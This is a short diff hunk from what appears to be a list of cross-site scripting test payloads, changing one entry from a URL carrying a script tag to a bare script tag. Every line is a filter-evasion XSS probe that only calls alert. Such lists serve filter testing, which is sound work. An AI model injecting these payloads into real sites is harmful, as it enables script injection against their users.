@@ -10,6 +10,6 @@
 <scr<script>ipt>alert('XSS')</script>
 <IMG SRC=JaVaScRiPt:alert('XSS')>
 {"name":"</script><script>alert('XSS')</script>"}
-http://exemplo.com/search?q=<script>alert('XSS')</script>
+<script>alert('XSS')</script>
 #<script>alert('XSS')</script>
 <img src=x onerror=alert('XSS')><script>alert('XSS')</script>
